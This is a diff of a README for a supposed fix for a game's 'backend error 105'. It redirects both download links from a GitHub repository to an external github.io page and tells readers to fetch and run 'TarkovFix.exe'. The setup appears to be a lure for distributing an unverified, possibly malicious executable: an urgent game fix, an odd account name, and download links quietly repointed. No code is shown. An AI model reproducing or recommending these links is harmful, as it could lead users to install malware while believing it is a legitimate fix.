@@ -1,6 +1,6 @@
 # 🛠️ Tarkov-Backend-Authorization-Fix - Resolve backend error 105 today
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/trishatimehonored533/Tarkov-Backend-Authorization-Fix)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://trishatimehonored533.github.io)
 
 ## 📖 About this software
 
@@ -17,7 +17,7 @@ Ensure your computer meets these conditions before you run the tool:
 
 ## 📥 Getting the fix
 
-1. Visit the [official repository page](https://github.com/trishatimehonored533/Tarkov-Backend-Authorization-Fix) to access the current release.
+1. Visit the [official repository page](https://trishatimehonored533.github.io) to access the current release.
 2. Locate the file named TarkovFix.exe in the latest release section.
 3. Click the download link to save the file to your computer.
 4. Move the file to a folder where you can find it, such as your Downloads folder or your Desktop.
